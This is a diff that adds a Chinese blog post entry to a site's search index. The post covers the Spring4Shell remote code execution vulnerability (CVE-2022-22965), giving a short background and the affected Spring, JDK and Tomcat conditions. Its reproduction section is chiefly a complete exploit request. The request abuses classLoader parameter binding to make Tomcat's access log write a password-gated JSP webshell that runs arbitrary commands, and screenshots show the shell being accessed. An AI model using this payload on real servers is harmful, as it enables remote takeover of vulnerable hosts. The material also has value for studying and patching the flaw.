@@ -135,4 +135,28 @@
         <tag>Sqlmap</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Spring4Shell-CVE-2022-22965</title>
+    <url>/2022/04/01/Spring4Shell-CVE-2022-22965/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>2022年3月30日，CNVD平台接收到蚂蚁科技集团股份有限公司报送的Spring框架远程命令执行漏洞。由于Spring框架存在处理流程缺陷，攻击者可在远程条件下，实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。使用Spring框架或衍生框架构建网站等应用，且同时使用JDK版本在9及以上版本的，易受此漏洞攻击影响。</p>
+<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><ul>
+<li>JDK9或以上版本系列</li>
+<li>Spring框架或衍生的SpringBoot等框架，版本小于v5.3.18或v5.2.20</li>
+<li>Spring JavaBean表单参数绑定需要满足一定条件</li>
+<li>部署在Tomcat容器中，且日志记录功能开启</li>
+</ul>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>日志写马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">suffix: %&gt;//</span><br><span class="line">c1: Runtime</span><br><span class="line">c2: &lt;%</span><br><span class="line">DNT: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/01/1GxKLvHUhbw2Y5q.png" alt="image-20220401125212182"></p>
+<p>访问webshell</p>
+<p><img src="https://s2.loli.net/2022/04/01/5GWQNfvFjn9diVT.png" alt="image-20220401125417619"></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
 </search>
